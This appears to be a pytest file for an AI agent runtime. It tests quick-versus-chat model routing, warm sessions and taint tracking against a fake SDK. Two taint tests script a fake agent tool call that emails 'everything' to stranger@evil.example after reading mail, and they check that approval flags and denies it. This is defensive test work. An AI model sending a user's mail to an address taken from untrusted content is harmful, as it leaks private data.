"""
[engine] quick_model on Claude Code: short chat messages go to the quick model (haiku), everything else to
chat_model (sonnet); "think" or "/sonnet" first forces chat_model. A conversation keeps one warm session per model,
sharing its taint. Offline: claude_agent_sdk is the fake (fake_sdk.py).
"""

import asyncio

import pytest

from tests.engines import test_claude_engine
from tests.engines.fake_sdk import call, init, result
from tests.engines.test_claude_engine import TOOLS, a_skill, approving, events_of
from tests.engines.test_warm_start import TypingTerminal, chat
from wraithd.channels.base import Attachment, Channel, Incoming
from wraithd.core import events as ev
from wraithd.run import chat_reason, run, strong_prefix
from wraithd.store import base as store_base

claude_rt = test_claude_engine.claude_rt  # the fixture


def clients_by_model(fake):
    found = {}
    for client in fake.ClaudeSDKClient.instances:
        found.setdefault(client.options.model, []).append(client)
    return found


def built(rt, run_id):
    return events_of(rt, run_id, ev.CONTEXT_BUILT)[0]


# --- which model, and why ---------------------------------------------------------------------------------------

@pytest.mark.parametrize('typed, rest, forced', [
    ('think what is 12 times 12', 'what is 12 times 12', True),
    ('Think: is this right?', 'is this right?', True),
    ('/sonnet what is 12 times 12', 'what is 12 times 12', True),
    ('/SONNET', '/SONNET', True),  # only the prefix: kept as it is
    ('thinking about lunch', 'thinking about lunch', False),
    ('think-tank news', 'think-tank news', False),
    ('I think so', 'I think so', False)])
def test_the_prefix(typed, rest, forced):
    assert strong_prefix(typed) == (rest, forced)


class Skill:
    def __init__(self, name, model=''):
        self.name, self.model = name, model


ENGINE = {'chat_model': 'sonnet', 'quick_model': 'haiku'}


@pytest.mark.parametrize('message, options, reason', [
    ("What's 12 times 12", {}, 'quick'),
    ('skip D1', {}, 'quick'),
    ('run news-feed', {}, 'skill'),
    ('use NEWS-FEED please', {}, 'skill'),
    ('news-feeds are great', {}, 'quick'),  # not the name as a whole word
    ('x' * 201, {}, 'length'),
    ('x' * 200, {}, 'quick'),
    ('/runs', {}, 'command'),
    ('hi', {'forced': True}, 'prefix'),
    ('hi', {'images': ['data:image/png;base64,AA']}, 'attachment'),
    ('hi', {'not_quick': 'attachment'}, 'attachment'),
    ('rewrite D2 shorter', {'not_quick': 'rewrite'}, 'rewrite'),
    ('yes', {'approval': True}, 'approval')])
def test_chat_reason(message, options, reason):
    assert chat_reason(ENGINE, message, [Skill('news-feed')], **options) == reason


async def test_a_short_question_goes_to_the_quick_session(claude_rt, claude_sdk):
    fake = claude_sdk([init(), result('144')])
    rt = claude_rt()
    answer = await run(rt, "What's 12 times 12", conversation='c1', tools=TOOLS)
    assert answer.answer == '144'
    [haiku] = clients_by_model(fake)['haiku']
    assert "USER: What's 12 times 12" in haiku.texts[0]
    context = built(rt, answer.run_id)
    assert (context['model'], context['model_reason']) == ('haiku', 'quick')
    await rt.close_sessions()


@pytest.mark.parametrize('typed', ['think what is 12 times 12', '/sonnet what is 12 times 12'])
async def test_the_prefix_goes_to_sonnet_without_it(claude_rt, claude_sdk, typed):
    fake = claude_sdk([init(), result('144')])
    rt = claude_rt()
    answer = await run(rt, typed, conversation='c1', tools=TOOLS)
    [sonnet] = clients_by_model(fake)['sonnet']
    assert 'USER: what is 12 times 12' in sonnet.texts[0]
    assert 'think' not in sonnet.texts[0].lower() and '/sonnet' not in sonnet.texts[0]
    context = built(rt, answer.run_id)
    assert (context['model'], context['model_reason']) == ('sonnet', 'prefix')
    assert events_of(rt, answer.run_id, ev.RUN_START)[0]['message'] == typed  # the log keeps what was typed
    await rt.close_sessions()


async def test_a_skill_name_goes_to_sonnet(claude_rt, claude_sdk, home):
    a_skill(home, 'news-feed')
    fake = claude_sdk([init(), result('the news')])
    rt = claude_rt()
    answer = await run(rt, 'run news-feed', conversation='c1', tools=TOOLS)
    (sonnet,) = clients_by_model(fake)['sonnet']
    assert 'USER: run news-feed' in sonnet.texts[0]
    assert built(rt, answer.run_id)['model_reason'] == 'skill'
    await rt.close_sessions()


async def test_a_long_message_goes_to_sonnet(claude_rt, claude_sdk):
    claude_sdk()
    rt = claude_rt()
    answer = await run(rt, 'please ' * 40, conversation='c1', tools=TOOLS)
    context = built(rt, answer.run_id)
    assert (context['model'], context['model_reason']) == ('sonnet', 'length')
    await rt.close_sessions()


async def test_a_waiting_approval_on_the_channel_goes_to_sonnet(claude_rt, claude_sdk):
    claude_sdk()
    rt = claude_rt()
    rt.store.create_approval('GMAIL_SEND_EMAIL', {'to': 'a@b.example'}, card={'channel': 'telegram'})
    elsewhere = await run(rt, 'yes', conversation='c1', tools=TOOLS)  # source chat: not that channel's card
    here = await run(rt, 'yes', conversation='c2', tools=TOOLS, source='telegram')
    assert built(rt, elsewhere.run_id)['model_reason'] == 'quick'
    assert built(rt, here.run_id)['model_reason'] == 'approval'
    await rt.close_sessions()


async def test_quick_model_off_keeps_every_chat_on_chat_model(claude_rt, claude_sdk):
    fake = claude_sdk()
    rt = claude_rt(quick_model='')
    answer = await run(rt, 'hi', conversation='c1', tools=TOOLS)
    assert list(clients_by_model(fake)) == ['sonnet'] and 'model_reason' not in built(rt, answer.run_id)
    await asyncio.sleep(0.01)
    assert len(fake.ClaudeSDKClient.instances) == 1  # nothing else starts
    await rt.close_sessions()


async def test_a_schedule_never_uses_the_quick_model(claude_rt, claude_sdk):
    fake = claude_sdk()
    rt = claude_rt(background_model='opus-cheap')
    await run(rt, 'hi', source='schedule')
    assert fake.calls[0]['options'].model == 'opus-cheap'


# --- two warm sessions per conversation -------------------------------------------------------------------------

async def test_one_connect_per_model(claude_rt, claude_sdk):
    fake = claude_sdk(*([init(), result('ok')] for _ in range(4)))
    rt = claude_rt()
    for message in ('hi', 'think about it', 'thanks', '/sonnet and this?'):
        await run(rt, message, conversation='c1', tools=TOOLS)
    found = clients_by_model(fake)
    assert sorted(found) == ['haiku', 'sonnet'] and all(len(clients) == 1 for clients in found.values())
    (haiku,), (sonnet,) = found['haiku'], found['sonnet']
    assert haiku.connects == sonnet.connects == 1
    assert len(haiku.texts) == len(sonnet.texts) == 2
    assert 'USER: hi' in haiku.texts[0] and 'USER: about it' in sonnet.texts[0]
    await rt.close_sessions()
    assert haiku.disconnects == sonnet.disconnects == 1 and rt.sessions.sessions == {}


async def test_a_new_session_gets_the_transcript(claude_rt, claude_sdk):
    """The other model's session starts after the first answer; its first message carries the history."""
    fake = claude_sdk([init(), result('one')], [result('two')])
    rt = claude_rt()
    await run(rt, 'hi', conversation='c1', tools=TOOLS)
    history = [{'role': 'user', 'content': 'hi'}, {'role': 'assistant', 'content': 'one'}]
    await run(rt, 'think hard', history=history, conversation='c1', tools=TOOLS)
    (sonnet,) = clients_by_model(fake)['sonnet']
    assert 'USER: hi' in sonnet.texts[0] and 'ASSISTANT: one' in sonnet.texts[0] and 'USER: hard' in sonnet.texts[0]
    await rt.close_sessions()


async def test_the_other_session_starts_after_the_first_answer(claude_rt, claude_sdk):
    """Telegram has no chat-opens moment: the first message starts its model's session, and the other model's
    starts in the background once it has answered, so the next message on it doesn't wait."""
    fake = claude_sdk([init(), result('one')], [result('two')], start_seconds=0.05)
    rt = claude_rt()
    await run(rt, 'hi', conversation='c1', tools=TOOLS, source='telegram')
    await asyncio.sleep(0.1)  # the background start is done
    assert [client.options.model for client in fake.ClaudeSDKClient.instances] == ['haiku', 'sonnet']
    (sonnet,) = clients_by_model(fake)['sonnet']
    assert sonnet.connects == 1 and sonnet.texts == []
    second = await run(rt, 'think again', conversation='c1', tools=TOOLS, source='telegram')
    assert sonnet.connects == 1 and len(sonnet.texts) == 1  # it used the started one
    [connect] = events_of(rt, second.run_id, ev.ENGINE_CONNECT)
    assert connect['early'] is True
    await rt.close_sessions()


async def test_taint_from_a_sonnet_turn_is_in_the_next_quick_turn(claude_rt, claude_sdk):
    to_stranger = call('GMAIL_SEND_EMAIL', {'to': 'stranger@evil.example', 'body': 'everything'})
    fake = claude_sdk([init(), call('GMAIL_FETCH_EMAILS', {'query': 'x'}), result('read it')],
                      [init(), to_stranger, result('asked')])
    rt, seen = claude_rt(), []
    first = await run(rt, 'think read my mail', conversation='c1', tools=TOOLS)
    second = await run(rt, 'send it to the sender', conversation='c1', tools=TOOLS,
                       callback=approving(rt, store_base.DENIED, seen))
    assert (built(rt, first.run_id)['model'], built(rt, second.run_id)['model']) == ('sonnet', 'haiku')
    assert 'GMAIL_FETCH_EMAILS' in events_of(rt, second.run_id, ev.RUN_START)[0]['untrusted_inputs']
    card = next(data for event_type, data in seen if event_type == 'approval_required')
    assert card['suspicious_recipients'] == [{'value': 'stranger@evil.example', 'source': 'GMAIL_FETCH_EMAILS'}]
    assert len(clients_by_model(fake)['haiku']) == 1
    await rt.close_sessions()


async def test_taint_from_a_quick_turn_is_in_the_next_sonnet_turn(claude_rt, claude_sdk):
    to_stranger = call('GMAIL_SEND_EMAIL', {'to': 'stranger@evil.example', 'body': 'everything'})
    claude_sdk([init(), call('GMAIL_FETCH_EMAILS', {'query': 'x'}), result('read it')],
               [init(), to_stranger, result('asked')])
    rt, seen = claude_rt(), []
    first = await run(rt, 'read my mail', conversation='c1', tools=TOOLS)
    second = await run(rt, 'think: send it to the sender', conversation='c1', tools=TOOLS,
                       callback=approving(rt, store_base.DENIED, seen))
    assert (built(rt, first.run_id)['model'], built(rt, second.run_id)['model']) == ('haiku', 'sonnet')
    assert 'GMAIL_FETCH_EMAILS' in events_of(rt, second.run_id, ev.RUN_START)[0]['untrusted_inputs']
    card = next(data for event_type, data in seen if event_type == 'approval_required')
    assert card['suspicious_recipients'] == [{'value': 'stranger@evil.example', 'source': 'GMAIL_FETCH_EMAILS'}]
    await rt.close_sessions()


async def test_a_failed_turn_drops_only_its_own_session(claude_rt, claude_sdk):
    fake = claude_sdk([init(), result('one')], [RuntimeError('boom')], [result('three')])
    rt = claude_rt()
    await run(rt, 'hi', conversation='c1', tools=TOOLS)
    await asyncio.sleep(0.01)  # the sonnet session has started
    failed = await run(rt, 'think hard', conversation='c1', tools=TOOLS)
    assert failed.outcome == 'failed'
    assert [model for _, model in rt.sessions.sessions] == ['haiku']
    await run(rt, 'ok', conversation='c1', tools=TOOLS)
    assert len(clients_by_model(fake)['haiku']) == 1  # the quick one kept going
    await rt.close_sessions()


async def test_both_close_together_when_idle(claude_rt, claude_sdk):
    fake = claude_sdk()
    rt = claude_rt()
    await run(rt, 'hi', conversation='c1', tools=TOOLS)
    await asyncio.sleep(0.01)
    later = asyncio.get_running_loop().time()
    assert await rt.sessions.reap(now=later) == []
    # one model used just now keeps both: the other isn't closed and started again every idle_minutes
    rt.sessions.sessions[('c1', 'sonnet')].last_used = later - 10_000
    assert await rt.sessions.reap(now=later + 1) == []
    assert await rt.sessions.reap(now=later + 10_000) == ['c1']
    assert rt.sessions.sessions == {}
    assert all(client.disconnects == 1 for client in fake.ClaudeSDKClient.instances)


async def test_both_close_on_quit(claude_rt, claude_sdk):
    fake = claude_sdk(start_seconds=0.02)
    rt = claude_rt()
    await chat(rt, TypingTerminal('hi', 'think hard', '/quit', typing=0.05))
    found = clients_by_model(fake)
    assert sorted(found) == ['haiku', 'sonnet'] and all(len(clients) == 1 for clients in found.values())
    assert all(client.connects == client.disconnects == 1 for clients in found.values() for client in clients)
    assert rt.sessions.sessions == {}


async def test_both_close_on_new(claude_rt, claude_sdk):
    fake = claude_sdk(start_seconds=0.02)
    rt = claude_rt()
    closed_at_new = []

    class Watching(TypingTerminal):
        def new_conversation(self):
            closed_at_new.extend(client.disconnects for client in fake.ClaudeSDKClient.instances[:2])
            super().new_conversation()

    await chat(rt, Watching('hi', '/new', 'again', typing=0.05))
    assert closed_at_new == [1, 1]  # the old conversation's two sessions closed at /new
    clients = fake.ClaudeSDKClient.instances
    assert len(clients) == 4  # and the new conversation started two of its own as /new opened it
    assert all(client.connects == client.disconnects == 1 for client in clients)
    assert rt.sessions.sessions == {}


# --- channels: what only the channel knows ----------------------------------------------------------------------

def test_a_channel_keeps_attachments_and_rewrites_on_chat_model():
    assert Channel.not_quick(Incoming(chat=1, text='hi')) == ''
    assert Channel.not_quick(Incoming(chat=1, caption='hi', attachment=Attachment('voice', 'r'))) == 'attachment'
    assert Channel.not_quick(Incoming(chat=1, text='rewrite D2 shorter', rewrite=True)) == 'rewrite'

